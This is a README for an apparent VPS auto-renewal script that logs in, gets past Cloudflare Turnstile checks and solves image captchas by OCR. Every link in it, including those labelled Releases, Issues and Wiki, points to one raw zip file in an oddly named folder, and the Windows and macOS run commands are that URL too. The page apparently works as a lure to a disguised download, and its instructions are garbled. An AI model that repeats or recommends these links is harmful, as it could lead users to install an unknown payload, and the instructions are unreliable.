# 🚀 Xserver-VPS-Renew - Seamless Renewal Automation for Your VPS

[![Download Xserver-VPS-Renew](https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip)](https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip)

## 📋 Project Overview

Xserver-VPS-Renew is a script designed to automate the renewal process for XServer’s free VPS (Virtual Private Server). This tool uses Playwright to control a web browser, mimicking user actions to complete the renewal process. Key features include:

- **Automatic Login**: Log in to your XServer panel effortlessly.
- **Expiration Check**: Automatically read the VPS usage period.
- **Renewal Trigger**: Determine if it's time to renew, starting one day before expiration.
- **Captcha Handling**: Navigate Cloudflare's verification system efficiently.
- **OCR Image Recognition**: Automatically capture and recognize image verification codes.
- **Renewal Submission**: Complete the renewal process without manual intervention.
- **Status Reporting**: Generate automatic updates on the renewal status.
- **Telegram Notifications**: Receive alerts about the renewal outcomes.
- **Execution Screenshot**: Keep a visual record of the renewal process.

This version does not use FlareSolverr and is suitable for XServer panels with light Cloudflare protection.

## 🚀 Getting Started

To get started with Xserver-VPS-Renew, follow these simple steps to download and run the software.

### 🔗 Download & Install

1. Visit the [Releases page](https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip) to download the latest version of Xserver-VPS-Renew.
2. Choose the appropriate file for your operating system and click on it to start the download:
   - For Windows, select `https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip`.
   - For macOS, choose `https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip`.
   - For Linux, download `https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip`.
3. Once the file is downloaded, extract it to a folder of your choice.

### ⚙️ System Requirements

- **Operating System**: Windows 10 or later, macOS High Sierra or later, or any Linux distribution.
- **Installed Browsers**: Compatible with the latest versions of Chrome or Chromium.
- **Network Connection**: A stable internet connection is required for the script to function properly.

## 📖 Usage Instructions

After downloading the files, follow these steps to run the application:

1. Open the terminal or command prompt.
2. Navigate to the folder where you extracted the files.
3. Run the script by entering the appropriate command:
   - For Windows: `https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip`.
   - For macOS: `https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip`.
   - For Linux: `./Xserver-VPS-Renew`.
4. You will be prompted to enter your XServer login details. Make sure to fill in the correct information.

### 🛠️ Script Configuration

Before running the script, you may want to configure certain environment variables. Here’s how:

1. **Set Your API URL**: If you are using a custom OCR API, replace the default URL with yours in the configuration file.
2. **Telegram Bot Setup**: To receive notifications, create a Telegram bot and add it to your chat. Use the bot token and chat ID in the configuration file.

### 🔔 Starting the Renewal Process

Once you've set up the script and configured the necessary details, running the script will automatically check for your VPS expiration date. The following will occur:

- The program will check if your renewal date is approaching.
- If it is time to renew, the script will handle the login process and submit your renewal request.
- You will receive a notification on Telegram about the renewal status (whether it was successful or if there were issues).

## 📅 Key Features

### 🎯 Automatic Expiration Date Check

- The script automatically determines the renewal date based on your VPS expiration. 
- It will execute the renewal process starting one day before the expiration date.

### 🤖 Cloudflare Turnstile Handling

- The script attempts to simulate mouse movements and clicks to manage the Cloudflare verification.
- It includes techniques such as frame scanning to handle most verification scenarios effectively.

### 🔍 Image Captcha Recognition

- The script captures any image-based captchas presented during the renewal process.
- Using OCR (Optical Character Recognition), it identifies and submits the verification as needed.

### 📬 Telegram Notification System

- You will receive updates at each stage: successful renewals, failures, and out-of-schedule conditions.
- This keeps you informed without needing to check the panel constantly.

### 📄 Automatic README Updates

- The script generates an updated status report, indicating whether the last renewal attempt was successful or if it failed.

### 📸 Execution Screenshots

- It captures key moments of the process, including login attempts, submission states, and error messages, for your records.

## 📜 Troubleshooting

If you encounter issues while using the script:

- Ensure your credentials are entered correctly.
- Check your internet connection.
- Review your OCR API setup to confirm it's working.
- Consult the logs generated by the script for detailed error messages that can guide you in fixing the issue.

For additional assistance, you can raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip).

## 🤝 Contributing

If you want to contribute to this project, please fork the repository and create a pull request with your suggestions.

## 📬 Contact

For questions or feedback, feel free to reach out via the GitHub repository or through the provided communication channels.

For more detailed guidance, check out the official documentation located in the [Wiki section](https://raw.githubusercontent.com/rizzu46/Xserver-VPS-Renew/main/Tragelaphus/Xserver-VPS-Renew-crepiness.zip). 

Thank you for using Xserver-VPS-Renew!